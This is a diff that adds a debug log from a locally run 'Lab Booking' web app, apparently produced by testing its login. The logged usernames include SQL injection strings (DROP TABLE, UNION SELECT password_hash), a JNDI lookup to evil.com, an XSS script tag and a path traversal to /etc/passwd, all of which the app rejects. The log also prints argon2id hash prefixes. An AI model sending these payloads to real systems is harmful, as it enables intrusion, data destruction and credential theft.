@@ -1,0 +1,63 @@
+Lab Booking ready: http://127.0.0.1:60712
+LOGIN-DBG2 user=' OR '1'='1 found=0 vfail=0 stored20=?
+LOGIN-DBG2 user='; DROP TABLE users;-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=1' UNION SELECT password_hash FROM users-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=admin'-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=" OR ""=" found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=' OR 1=1; DELETE FROM users;-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=x' AND (SELECT count(*) FROM users)>0-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=${jndi:ldap://evil.com/a} found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=<script>alert(1)</script> found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=../../etc/passwd found=0 vfail=0 stored20=?
+Lab Booking ready: http://127.0.0.1:60821
+LOGIN-DBG2 user=' OR '1'='1 found=0 vfail=0 stored20=?
+LOGIN-DBG2 user='; DROP TABLE users;-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=1' UNION SELECT password_hash FROM users-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=admin'-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=" OR ""=" found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=' OR 1=1; DELETE FROM users;-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=x' AND (SELECT count(*) FROM users)>0-- found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=${jndi:ldap://evil.com/a} found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=<script>alert(1)</script> found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=../../etc/passwd found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=nonexistent_user_xyz found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=nonexistent_user_xyz found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=nonexistent_user_xyz found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=nonexistent_user_xyz found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=nonexistent_user_xyz found=0 vfail=0 stored20=?
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+LOGIN-DBG2 user=admin found=1 vfail=0 stored20=$argon2id$v=19$m=655
+Lab Booking ready: http://127.0.0.1:58720
+Database initialization/integrity check failed (code 11).
+Lab Booking ready: http://127.0.0.1:59608
+Lab Booking ready: http://127.0.0.1:51143
+Database initialization/integrity check failed (code 11).
+Lab Booking ready: http://127.0.0.1:57125
